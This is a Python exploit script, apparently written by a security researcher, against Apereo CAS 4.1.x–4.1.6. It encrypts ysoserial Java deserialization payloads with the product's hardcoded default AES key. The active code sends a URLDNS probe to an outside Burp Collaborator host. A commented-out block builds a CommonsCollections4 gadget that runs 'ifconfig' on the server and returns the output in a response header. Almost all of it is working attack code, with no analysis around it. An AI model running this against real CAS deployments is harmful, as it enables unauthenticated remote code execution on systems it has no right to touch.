# -*- encoding: utf-8 -*-
'''
@File    :   cas1.py
@Time    :   2020/07/31 19:17:28
@Author  :   cl0und 
@Version :   1.0
@Contact :   cl0und@syclover
'''

# attack cas 4.1.x-4.1.6

from jose import jws
from Crypto.Cipher import AES
from cStringIO import StringIO
import requests
import base64
import zlib
import uuid
import binascii
import json
import subprocess

#key = base64.b64decode("TtGw50w3x5Gv/co+dg9xAA==")
key = "nSLn5Z6XchxUBXel"
iv = uuid.uuid4().bytes
header = b'\x00\x00\x00\x22\x00\x00\x00\x10'+iv+'\x00\x00\x00\x06'+'aes128'

JAR_FILE="ysoserial-cas-all.jar"
def base64Padding(data):
    missing_padding = 4 - len(data) % 4
    if missing_padding and missing_padding != 4:
        data += '=' * missing_padding
    return data

def ase_encode(payload):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    encryptor = AES.new(key, mode, iv)
    file_body = pad(payload)
    cipher = encryptor.encrypt(file_body)
    return cipher

def aes_decode(iv, cipher):
    mode =  AES.MODE_CBC
    encryptor = AES.new(key, mode, IV=iv)
    payload = encryptor.decrypt(cipher)
    return payload

def decode(data):
    try:
        payload = base64.b64decode(data)
        cipher = payload[34:]
        iv = payload[8:24]
        data = aes_decode(iv, cipher)
        return zlib.decompress(data, zlib.MAX_WBITS|16)
    except Exception as e:
        print(e)

def encode(data):
    gzip_compress = zlib.compressobj(9, zlib.DEFLATED, zlib.MAX_WBITS | 16)
    data = gzip_compress.compress(data) + gzip_compress.flush()
    payload = ase_encode(data)
    return base64Padding(base64.b64encode(header+payload))

if __name__ == '__main__':

    command = "http://1y0lcq5xqp0mec8pvdyne049j0pqdf.burpcollaborator.net"
    popen = subprocess.Popen(['java', '-jar', JAR_FILE, 'URLDNS', command],stdout=subprocess.PIPE)


    # command = '''code:org.springframework.webflow.context.ExternalContext externalContext = org.springframework.webflow.context.ExternalContextHolder.getExternalContext();
    # org.apache.catalina.connector.ResponseFacade responseFacade = (org.apache.catalina.connector.ResponseFacade) externalContext.getNativeResponse();
    # java.io.InputStream in = Runtime.getRuntime().exec("ifconfig").getInputStream();java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
    # byte[] b = new byte[1024];int a = -1;
    # while ((a = in.read(b)) != -1) {baos.write(b, 0, a);}
    # responseFacade.setHeader("Syclover",new String(b));'''
    
    #popen = subprocess.Popen(['java', '-jar', JAR_FILE, 'CommonsCollections4', command],stdout=subprocess.PIPE)
    
    payload = encode(popen.stdout.read())
    print(payload)